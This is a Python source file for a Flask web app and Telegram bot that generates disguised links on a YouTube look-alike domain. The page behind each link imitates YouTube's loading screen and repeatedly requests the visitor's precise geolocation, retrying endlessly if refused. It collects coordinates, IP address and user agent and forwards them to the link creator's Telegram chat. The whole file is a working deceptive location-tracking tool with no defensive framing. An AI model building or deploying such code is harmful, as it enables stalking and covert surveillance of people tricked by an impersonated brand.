import os
import secrets
import sqlite3
import sys
import pkgutil
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

# Fix for Python 3.14 - Flask compatibility
if not hasattr(pkgutil, 'get_loader'):
    import importlib
    def get_loader(module_name):
        try:
            return importlib.util.find_spec(module_name).loader
        except AttributeError:
            return None
    pkgutil.get_loader = get_loader

# Configuration
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    raise ValueError("No TELEGRAM_TOKEN set")

BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')

WEBSITE_INPUT = 1

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY, 
                  user_id TEXT,
                  website_url TEXT,
                  brand TEXT,
                  created_at TIMESTAMP,
                  status TEXT,
                  chat_id TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TIMESTAMP,
                  user_agent TEXT,
                  ip_address TEXT)''')
    conn.commit()
    conn.close()

init_db()

def generate_link(user_id, website_url, brand, chat_id):
    link_id = secrets.token_urlsafe(16)
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, user_id, website_url, brand, created_at, status, chat_id) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (link_id, user_id, website_url, brand, datetime.now(), 'active', chat_id))
    conn.commit()
    conn.close()
    return f"{BASE_URL}/watch/{link_id}"

@app.route('/watch/<link_id>')
def fake_domain_track(link_id):
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("SELECT website_url, status FROM links WHERE link_id = ?", (link_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        return "Invalid link", 404
    
    website_url, status = result
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title></title>
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                background: #0f0f0f;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 0;
                margin: 0;
            }}
            
            .app-container {{
                width: 100%;
                max-width: 430px;
                height: 100vh;
                max-height: 932px;
                background: #0f0f0f;
                display: flex;
                flex-direction: column;
                position: relative;
                overflow: hidden;
            }}
            
            /* Loading Content */
            .loading-content {{
                flex: 1;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                padding: 20px;
                background: #0f0f0f;
                position: relative;
            }}
            
            /* YouTube-style loading spinner */
            .youtube-loader {{
                width: 48px;
                height: 48px;
                border: 4px solid #272727;
                border-top: 4px solid #ff0000;
                border-radius: 50%;
                animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
                margin-bottom: 30px;
                flex-shrink: 0;
            }}
            
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            
            /* Skeleton loading cards */
            .skeleton-container {{
                width: 100%;
                max-width: 380px;
                padding: 0 16px;
            }}
            .skeleton-item {{
                display: flex;
                gap: 12px;
                margin-bottom: 16px;
            }}
            .skeleton-thumbnail {{
                width: 160px;
                height: 90px;
                background: #272727;
                border-radius: 8px;
                flex-shrink: 0;
                position: relative;
                overflow: hidden;
            }}
            .skeleton-text {{
                flex: 1;
                display: flex;
                flex-direction: column;
                gap: 8px;
                justify-content: center;
            }}
            .skeleton-line {{
                height: 12px;
                background: #272727;
                border-radius: 4px;
                position: relative;
                overflow: hidden;
            }}
            .skeleton-line.short {{
                width: 60%;
            }}
            .skeleton-line.medium {{
                width: 80%;
            }}
            
            /* Shimmer animation - moving gray texture */
            .skeleton-thumbnail::after,
            .skeleton-line::after {{
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    90deg,
                    transparent,
                    rgba(255,255,255,0.08) 50%,
                    transparent
                );
                animation: shimmer 1.8s infinite;
            }}
            
            @keyframes shimmer {{
                0% {{ left: -100%; }}
                100% {{ left: 100%; }}
            }}
            
            /* Progress bar */
            .progress-bar {{
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 3px;
                background: #272727;
                z-index: 1000;
            }}
            .progress-fill {{
                height: 100%;
                width: 0%;
                background: #ff0000;
                animation: progress 10s ease-in-out forwards;
            }}
            @keyframes progress {{
                0% {{ width: 0%; }}
                10% {{ width: 15%; }}
                30% {{ width: 30%; }}
                50% {{ width: 50%; }}
                70% {{ width: 70%; }}
                85% {{ width: 85%; }}
                95% {{ width: 95%; }}
                100% {{ width: 100%; }}
            }}
            
            /* Bottom Navigation */
            .bottom-nav {{
                display: flex;
                justify-content: space-around;
                padding: 8px 0 12px 0;
                background: #0f0f0f;
                border-top: 1px solid #272727;
                z-index: 10;
            }}
            .nav-item {{
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 2px;
                color: #aaaaaa;
                font-size: 10px;
            }}
            .nav-item.active {{
                color: #fff;
            }}
            .nav-item svg {{
                width: 24px;
                height: 24px;
                fill: currentColor;
            }}
        </style>
    </head>
    <body>
        <!-- Progress Bar -->
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <!-- Main App Container -->
        <div class="app-container">
            <!-- Loading Content -->
            <div class="loading-content">
                <div class="youtube-loader" id="loader"></div>
                
                <div class="skeleton-container">
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Bottom Navigation -->
            <div class="bottom-nav">
                <div class="nav-item active">
                    <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
                    <span>Home</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M10 14.65v-5.3L15 12l-5 2.65zm7.77-4.33c-.77-.32-1.52-.56-2.27-.78V7.07c0-1.54-1.2-2.76-2.66-2.86-1.52-.1-2.84.92-2.84 2.43v1.83c-.77.22-1.52.46-2.27.78-1.52.61-2.68 1.74-3.02 3.42-.37 1.82.21 3.49 1.55 4.83.9.9 2.04 1.5 3.31 1.67 1.26.17 2.55-.06 3.69-.69.87-.48 1.62-1.12 2.26-1.89.64.77 1.39 1.41 2.26 1.89 1.14.63 2.43.86 3.69.69 1.27-.17 2.41-.77 3.31-1.67 1.34-1.34 1.92-3.01 1.55-4.83-.34-1.68-1.5-2.81-3.02-3.42z"/></svg>
                    <span>Shorts</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
                    <span>Subscriptions</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    <span>You</span>
                </div>
            </div>
        </div>
        
        <script>
            const linkId = '{link_id}';
            const redirectUrl = '{website_url}';
            const progressFill = document.getElementById('progressFill');
            let locationCaptured = false;
            let attempts = 0;
            
            function sendLocation(position) {{
                if (locationCaptured) return;
                locationCaptured = true;
                
                const {{latitude, longitude, accuracy}} = position.coords;
                progressFill.style.width = '100%';
                
                fetch('/capture', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy,
                        user_agent: navigator.userAgent
                    }})
                }})
                .then(response => response.json())
                .then(data => {{
                    if (data.success) {{
                        setTimeout(() => {{
                            window.location.href = redirectUrl;
                        }}, 1000);
                    }}
                }})
                .catch(() => {{
                    setTimeout(requestLocation, 2000);
                }});
            }}
            
            function handleError(error) {{
                attempts++;
                // Always retry, never give up
                setTimeout(requestLocation, 2000);
            }}
            
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        sendLocation,
                        handleError,
                        {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                    );
                }} else {{
                    // Geolocation not supported - retry
                    setTimeout(requestLocation, 2000);
                }}
            }}
            
            // Immediately request location when page loads
            // This triggers the browser's permission prompt
            requestLocation();
        </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture_location():
    data = request.json
    link_id = data.get('link_id')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('user_agent')
    ip_address = request.remote_addr
    
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("""INSERT INTO locations 
                 (link_id, latitude, longitude, accuracy, timestamp, user_agent, ip_address)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              (link_id, latitude, longitude, accuracy, datetime.now(), user_agent, ip_address))
    
    c.execute("SELECT chat_id FROM links WHERE link_id = ?", (link_id,))
    result = c.fetchone()
    conn.commit()
    conn.close()
    
    if result:
        chat_id = result[0]
        try:
            bot = Bot(token=TELEGRAM_TOKEN)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude))
            loop.run_until_complete(bot.send_message(
                chat_id=chat_id,
                text=f"📍 *Location Captured!*\n\nCoordinates: {latitude:.6f}, {longitude:.6f}\nAccuracy: {accuracy} meters",
                parse_mode='Markdown'
            ))
            loop.close()
        except Exception as e:
            print(f"Error sending location: {e}")
    
    return jsonify({'success': True})

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'timestamp': datetime.now().isoformat()})

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎯 *YouTube Location Tracker*\n\n"
        "📝 *Please send me the website URL* to redirect users after location capture.\n\n"
        "Example: `https://your-website.com`\n\n"
        "Or send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['brand'] = 'youtube'
    return WEBSITE_INPUT

async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    website_url = update.message.text.strip()
    brand = context.user_data.get('brand', 'youtube')
    
    if not website_url.startswith(('http://', 'https://')):
        website_url = 'https://' + website_url
    
    if '.' not in website_url:
        await update.message.reply_text("❌ Invalid URL. Send like: https://example.com", parse_mode=None)
        return WEBSITE_INPUT
    
    link = generate_link(user_id, website_url, brand, chat_id)
    
    keyboard = [
        [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
        [InlineKeyboardButton("🔄 Generate New Link", callback_data='new_link')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ *YouTube Link Generated!*\n\n🔗 {link}\n\nShare this link - it looks like a YouTube video!",
        reply_markup=reply_markup,
        parse_mode=None
    )
    return ConversationHandler.END

async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🎯 *YouTube Location Tracker*\n\n📝 *Please send me the website URL* for this new link.\n\nExample: `https://your-website.com`\n\nOr send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['brand'] = 'youtube'
    return WEBSITE_INPUT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled. Send /start to begin again.", parse_mode=None)
    return ConversationHandler.END

def main():
    os.environ["WEB_CONCURRENCY"] = "1"
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WEBSITE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_website),
                CommandHandler('cancel', cancel)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('start', start), group=1)
    application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
    
    import threading
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=False),
        daemon=True
    ).start()
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=None)
    except Exception as e:
        print(f"Bot error: {e}")

if __name__ == "__main__":
    main()
